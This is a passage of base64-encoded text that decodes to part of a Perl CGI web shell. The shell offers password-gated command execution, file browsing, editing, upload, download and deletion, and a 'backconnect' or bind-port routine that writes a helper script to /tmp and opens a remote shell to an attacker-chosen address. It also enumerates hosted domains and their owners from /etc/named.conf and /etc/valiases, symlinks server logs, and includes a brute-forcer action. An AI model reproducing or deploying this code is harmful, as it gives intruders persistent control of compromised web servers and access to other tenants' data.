NCgl9ZWxzaWYoISRDbGllbnRBZGRyIGVxICIiKQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmFja3BlcmwpOw0KCQlpZigtdyAiL3RtcC8iKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iYWNrY29ubmVjdC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmFja2Nvbm5lY3QucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgYmFja2Nvbm5lY3QucGwgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX1lbHNlDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiaW5kcGVybCk7DQoJCWlmKC13ICIvdG1wIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmluZHBvcnQucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJpbmRwb3J0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsIGJpbmRwb3J0LnBsICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojICBBcnJheSBMaXN0IERpcmVjdG9yeQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJtRGlyKCQpIA0Kew0KCW15ICRkaXIgPSBzaGlmdDsNCiAgICBpZihvcGVuZGlyKERJUiwkZGlyKSkNCgl7DQoJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQl7DQoJCQlpZigoJGZpbGUgbmUgIi4iKSAmJiAoJGZpbGUgbmUgIi4uIikpDQoJCQl7DQoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7DQoJCQkJaWYoLWQgJGZpbGUpDQoJCQkJew0KCQkJCQkmUm1EaXIoJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQl1bmxpbmsoJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQljbG9zZWRpcihESVIpOw0KCX0NCglpZighcm1kaXIoJGRpcikpDQoJew0KCQkNCgl9DQp9DQpzdWIgRmlsZU93bmVyKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZSAkZmlsZSkNCgl7DQoJCSgkdWlkLCRnaWQpID0gKHN0YXQoJGZpbGUpKVs0LDVdOw0KCQlpZigkV2luTlQpDQoJCXsNCgkJCXJldHVybiAiPz8/IjsNCgkJfQ0KCQllbHNlDQoJCXsNCgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOw0KCQkJJGdyb3VwPWdldGdyZ2lkKCRnaWQpOw0KCQkJcmV0dXJuICRuYW1lLiIvIi4kZ3JvdXA7DQoJCX0NCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIFBhcmVudEZvbGRlcigkKQ0Kew0KCW15ICRwYXRoID0gc2hpZnQ7DQoJbXkgJENvbW0gPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiJjZCAuLiIuJENtZFNlcC4kQ21kUHdkOw0KCWNob3AoJHBhdGggPSBgJENvbW1gKTsNCglyZXR1cm4gJHBhdGg7DQp9DQpzdWIgRmlsZVBlcm1zKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglteSAkdXIgPSAiLSI7DQoJbXkgJHV3ID0gIi0iOw0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQlpZigtciAkZmlsZSl7ICR1ciA9ICJyIjsgfQ0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0NCgkJCXJldHVybiAkdXIgLiAiIC8gIiAuICR1dzsNCgkJfWVsc2UNCgkJew0KCQkJJG1vZGU9KHN0YXQoJGZpbGUpKVsyXTsNCgkJCSRyZXN1bHQgPSBzcHJpbnRmKCIlMDRvIiwgJG1vZGUgJiAwNzc3Nyk7DQoJCQlyZXR1cm4gJHJlc3VsdDsNCgkJfQ0KCX0NCglyZXR1cm4gIjAwMDAiOw0KfQ0Kc3ViIEZpbGVMYXN0TW9kaWZpZWQoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCRsYSkgPSAoc3RhdCgkZmlsZSkpWzldOw0KCQkoJGQsJG0sJHksJGgsJGkpID0gKGxvY2FsdGltZSgkbGEpKVszLDQsNSwyLDFdOw0KCQkkeSA9ICR5ICsgMTkwMDsNCgkJQG1vbnRoID0gcXcvMSAyIDMgNCA1IDYgNyA4IDkgMTAgMTEgMTIvOw0KCQkkbG10aW1lID0gc3ByaW50ZigiJTAyZC8lcy8lNGQgJTAyZDolMDJkIiwkZCwkbW9udGhbJG1dLCR5LCRoLCRpKTsNCgkJcmV0dXJuICRsbXRpbWU7DQoJfQ0KCXJldHVybiAiPz8/IjsNCn0NCnN1YiBGaWxlU2l6ZSgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWYgJGZpbGUpDQoJew0KCQlyZXR1cm4gLXMgJGZpbGU7DQoJfQ0KCXJldHVybiAiMCI7DQoNCn0NCnN1YiBQYXJzZUZpbGVTaXplKCQpDQp7DQoJbXkgJHNpemUgPSBzaGlmdDsNCglpZigkc2l6ZSA8PSAxMDI0KQ0KCXsNCgkJcmV0dXJuICRzaXplLiAiIEIiOw0KCX0NCgllbHNlDQoJew0KCQlpZigkc2l6ZSA8PSAxMDI0KjEwMjQpIA0KCQl7DQoJCQkkc2l6ZSA9IHNwcmludGYoIiUuMDJmIiwkc2l6ZSAvIDEwMjQpOw0KCQkJcmV0dXJuICRzaXplLiIgS0IiOw0KCQl9DQoJCWVsc2UgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBNQiI7DQoJCX0NCgl9DQp9DQpzdWIgdHJpbSgkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nID1+IHMvXlxzKy8vOw0KCSRzdHJpbmcgPX4gcy9ccyskLy87DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgQWRkU2xhc2hlcygkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7DQoJcmV0dXJuICRzdHJpbmc7DQp9DQpzdWIgTGlzdERpcg0Kew0KCW15ICRwYXRoID0gJEN1cnJlbnREaXIuJFBhdGhTZXA7DQoJJHBhdGg9fiBzL1xcXFwvXFwvZzsNCglteSAkcmVzdWx0ID0gIjxmb3JtIG5hbWU9J2YnIGFjdGlvbj0nJFNjcmlwdExvY2F0aW9uJz48c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPlBhdGg6IFsgIi4mQWRkTGlua0RpcigiZ3VpIikuIiBdIDwvc3Bhbj48aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZCcgc2l6ZT0nNDAnIHZhbHVlPSckQ3VycmVudERpcicgLz48aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdhJyB2YWx1ZT0nZ3VpJz48aW5wdXQgY2xhc3M9J3N1Ym1pdCcgdHlwZT0nc3VibWl0JyB2YWx1ZT0nQ2hhbmdlJz48L2Zvcm0+IjsNCglpZigtZCAkcGF0aCkNCgl7DQoJCW15IEBmbmFtZSA9ICgpOw0KCQlteSBAZG5hbWUgPSAoKTsNCgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQ0KCQl7DQoJCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkNCgkJCXsNCgkJCQkkZj0kcGF0aC4kZmlsZTsNCgkJCQlpZigtZCAkZikNCgkJCQl7DQoJCQkJCXB1c2goQGRuYW1lLCRmaWxlKTsNCgkJCQl9DQoJCQkJZWxzZQ0KCQkJCXsNCgkJCQkJcHVzaChAZm5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJCWNsb3NlZGlyKERJUik7DQoJCX0NCgkJQGZuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGZuYW1lOw0KCQlAZG5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZG5hbWU7DQoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4NCg0KCQk8dHIgc3R5bGU9J2JhY2tncm91bmQtY29sb3I6ICMzZTNlM2UnPjx0aD5GaWxlIE5hbWU8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoxNTBweDsnPk93bmVyPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoxMDBweDsnPlBlcm1pc3Npb248L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MjYwcHg7Jz5BY3Rpb248L3RoPjwvdHI+IjsNCgkJbXkgJHN0eWxlPSJsaW5lIjsNCgkJbXkgJGk9MDsNCgkJZm9yZWFjaCBteSAkZCAoQGRuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGQgPSAmdHJpbSgkZCk7DQoJCQkkZGlybmFtZT0kZDsNCgkJCWlmKCRkIGVxICIuLiIpIA0KCQkJew0KCQkJCSRkID0gJlBhcmVudEZvbGRlcigkcGF0aCk7DQoJCQl9DQoJCQllbHNpZigkZCBlcSAiLiIpIA0KCQkJew0KCQkJCSRkID0gJHBhdGg7DQoJCQl9DQoJCQllbHNlIA0KCQkJew0KCQkJCSRkID0gJHBhdGguJGQ7DQoJCQl9DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+DQoNCgkJCTx0ZCBpZD0nRmlsZV8kaScgc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz48YSAgaHJlZj0nP2E9Z3VpJmQ9Ii4kZC4iJz5bICIuJGRpcm5hbWUuIiBdPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZU93bmVyKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGQpLiInLCciLiRkaXJuYW1lLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgiLiRpLiIsJyIuJGRpcm5hbWUuIicpXCIgPiIuJkZpbGVQZXJtcygkZCkuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz48YSBocmVmPSdqYXZhc2NyaXB0OnJldHVybiBmYWxzZTsnIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGRpcm5hbWUnLCciLiZBZGRTbGFzaGVzKCZBZGRTbGFzaGVzKCRkKSkuIicpXCI+UmVuYW1lPC9hPiAgfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBkaXI6ICRkaXJuYW1lID8nKSkgeyByZXR1cm4gZmFsc2U7fVwiIGhyZWY9Jz9hPWd1aSZkPSRwYXRoJnJlbW92ZT0kZGlybmFtZSc+UmVtb3ZlPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJZm9yZWFjaCBteSAkZiAoQGZuYW1lKQ0KCQl7DQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGU9JGY7DQoJCQkkZiA9ICRwYXRoLiRmOw0KCQkJJHZpZXcgPSAiP2Rpcj0iLiRwYXRoLiImdmlldz0iLiRmOw0KCQkJJHJlc3VsdCAuPSAiPHRyIGNsYXNzPSckc3R5bGUnPjx0ZCBpZD0nRmlsZV8kaScgc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz4iLiRmaWxlLiI8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGYpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOycgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZikuIicsJyIuJGZpbGUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCRpLCckZmlsZScpXCIgPiIuJkZpbGVQZXJtcygkZikuIjwvc3Bhbj48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+RWRpdDwvYT4gfCA8YSBocmVmPSdqYXZhc2NyaXB0OnJldHVybiBmYWxzZTsnIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGZpbGUnLCdmJylcIj5SZW5hbWU8L2E+IHwgPGEgaHJlZj0nP2E9ZG93bmxvYWQmbz1nbyZmPSIuJGYuIic+RG93bmxvYWQ8L2E+IHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZmlsZTogJGZpbGUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRmaWxlJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQkkcmVzdWx0IC49ICI8L3RhYmxlPjwvZGl2PiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUcnkgdG8gVmlldyBMaXN0IFVzZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3RG9tYWluVXNlcg0Kew0KCW9wZW4gKGRvbWFpbnMsICcvZXRjL25hbWVkLmNvbmYnKSBvciAkZXJyPTE7DQoJbXkgQGNuenMgPSA8ZG9tYWlucz47DQoJY2xvc2UgZDBtYWluczsNCglteSAkc3R5bGU9ImxpbmUiOw0KCW15ICRyZXN1bHQ9IjxoNT48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOw0KCWlmICgkZXJyKQ0KCXsNCgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7DQoJCXJldHVybiAkcmVzdWx0Ow0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICc8dGFibGU+PHRyPjx0aD5Eb21haW5zPC90aD4gPHRoPlVzZXI8L3RoPjwvdHI+JzsNCgl9DQoJZm9yZWFjaCBteSAkb25lIChAY256cykNCgl7DQoJCWlmKCRvbmUgPX4gbS8uKj96b25lICIoLio/KSIgey8pDQoJCXsJDQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGVuYW1lPSAiL2V0Yy92YWxpYXNlcy8iLiRvbmU7DQoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7DQoJCQkkcmVzdWx0IC49ICc8dHIgY2xhc3M9IiRzdHlsZSIgd2lkdGg9NTAlPjx0ZD4nLiRvbmUuJyA8L3RkPjx0ZD4gJy4kb3duZXIuJzwvdGQ+PC90cj4nOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJzwvdGFibGU+JzsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVmlldyBMb2cNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3TG9nDQp7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJcmV0dXJuICI8aDI+PGZvbnQgc3R5bGU9J2ZvbnQ6IDIwcHQgVmVyZGFuYTtjb2xvcjogI2ZmOTkwMDsnPkRvbid0IHJ1biBvbiBXaW5kb3dzPC9mb250PjwvaDI+IjsNCgl9DQoJbXkgJHJlc3VsdD0iPHRhYmxlPjx0cj48dGg+UGF0aCBMb2c8L3RoPjx0aD5TdWJtaXQ8L3RoPjwvdHI+IjsNCglteSBAcGF0aGxvZz0oDQoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywNCgkJCQknL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nJywNCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9hY2Nlc3NfbG9nJw0KCQkJCSk7DQoJbXkgJGk9MDsNCglteSAkcGVybXM7DQoJbXkgJHNsOw0KCWZvcmVhY2ggbXkgJGxvZyAoQHBhdGhsb2cpDQoJew0KCQlpZigtdyAkbG9nKQ0KCQl7DQoJCQkkcGVybXM9Ik9LIjsNCgkJfWVsc2UNCgkJew0KCQkJY2hvcCgkc2wgPSBgbG4gLXMgJGxvZyBlcnJvcl9sb2dfJGlgKTsNCgkJCWlmKCZ0cmltKCRscykgZXEgIiIpDQoJCQl7DQoJCQkJaWYoLXIgJGxzKQ0KCQkJCXsNCgkJCQkJJHBlcm1zPSJPSyI7DQoJCQkJCSRsb2c9ImVycm9yX2xvZ18iLiRpOw0KCQkJCX0NCgkJCX1lbHNlDQoJCQl7DQoJCQkJJHBlcm1zPSI8Zm9udCBzdHlsZT0nY29sb3I6IHJlZDsnPkNhbmNlbDxmb250PiI7DQoJCQl9DQoJCX0NCgkJJHJlc3VsdCAuPTw8RU5EOw0KCQk8dHI+DQoNCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPg0KCQkJPHRkPjxpbnB1dCB0eXBlPSJ0ZXh0IiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9nXyRpJykudmFsdWU9J2xlc3MgJyArIHRoaXMudmFsdWU7IiB2YWx1ZT0iJGxvZyIgc2l6ZT0nNTAnLz48L3RkPg0KCQkJPHRkPjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJUcnkiIC8+PC90ZD4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJsb2dfJGkiIG5hbWU9ImMiIHZhbHVlPSJsZXNzICRsb2ciLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJjb21tYW5kIiAvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIiAvPg0KCQkJPC9mb3JtPg0KCQkJPHRkPiRwZXJtczwvdGQ+DQoNCgkJPC90cj4NCkVORA0KCQkkaSsrOw0KCX0NCgkkcmVzdWx0IC49IjwvdGFibGU+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQokQWN0aW9uID0gJGlueydhJ307DQoNCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQNCg0KIyBnZXQgdGhlIGRpcmVjdG9yeSBpbiB3aGljaCB0aGUgY29tbWFuZHMgd2lsbCBiZSBleGVjdXRlZA0KJEN1cnJlbnREaXIgPSAmdHJpbSgkaW57J2QnfSk7DQojIG1hYyBkaW5oIHh1YXQgdGhvbmcgdGluIG5ldSBrbyBjbyBsZW5oIG5hbyENCiRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIiBpZigkUnVuQ29tbWFuZCBlcSAiIik7DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pIAkJIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZ3VpIikgIyBHVUkgZGlyZWN0b3J5DQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOw0KCQlpZighKCRjaG1vZCBlcSAwKSkNCgkJew0KCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOw0KCQkJJGZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgkJCWNob3AoJHJlc3VsdD0gYGNobW9kICRjaG1vZCAiJGZpbGUiYCk7DQoJCQlpZigmdHJpbSgkcmVzdWx0KSBlcSAiIikNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCQl9DQoJCX0NCgl9DQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9Ow0KCWlmKCEkcmVuYW1lIGVxICIiKQ0KCXsNCgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpDQoJCXsNCgkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJfWVsc2UNCgkJew0KCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJfQ0KCX0NCgkkcmVtb3ZlPSRpbnsncmVtb3ZlJ307DQoJaWYoJHJlbW92ZSBuZSAiIikNCgl7DQoJCSRybSA9ICRDdXJyZW50RGlyLiRQYXRoU2VwLiRyZW1vdmU7DQoJCWlmKC1kICRybSkNCgkJew0KCQkJJlJtRGlyKCRybSk7DQoJCX1lbHNlDQoJCXsNCgkJCWlmKHVubGluaygkcm0pKQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJCX0JCQkNCgkJfQ0KCX0NCglwcmludCAmTGlzdERpcjsNCg0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJcHJpbnQgJkV4ZWN1dGVDb21tYW5kOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic2F2ZSIpCQkJCSAJIyB1c2VyIHdhbnRzIHRvIHNhdmUgYSBmaWxlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglpZigmU2F2ZUZpbGUoJGlueydkYXRhJ30sJGlueydmaWxlJ30pKQ0KCXsNCgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCX1lbHNlDQoJew0KCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCX0NCglwcmludCAmTGlzdERpcjsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpIAkJCQkJIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KDQoJcHJpbnQgJlVwbG9hZEZpbGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJiYWNrYmluZCIpIAkJCQkjIHVzZXIgd2FudHMgdG8gYmFjayBjb25uZWN0IG9yIGJpbmQgcG9ydA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsNCglwcmludCAmQmFja0JpbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJicnV0ZWZvcmNlciIpIAkJCSMgdXNlciB3YW50cyB0byBicnV0ZSBmb3JjZQ0Kew0KCSZQcmludFBhZ2VIZWFkZXI7DQoJcHJpbnQgJkJydXRlRm9yY2VyOw0KfWVsc2lmKCRBY3Rpb24gZXEgImRvd25sb2FkIikgCQkJCSMgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUNCnsNCglwcmludCAmRG93bmxvYWRGaWxlOw0KfWVsc2lmKCRBY3Rpb24gZXEgImNoZWNrbG9nIikgCQkJCSMgdXNlciB3YW50cyB0byB2aWV3IGxvZyBmaWxlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0xvZzsNCg0KfWVsc2lmKCRBY3Rpb24gZXEgImRvbWFpbnN1c2VyIikgCQkJIyB1c2VyIHdhbnRz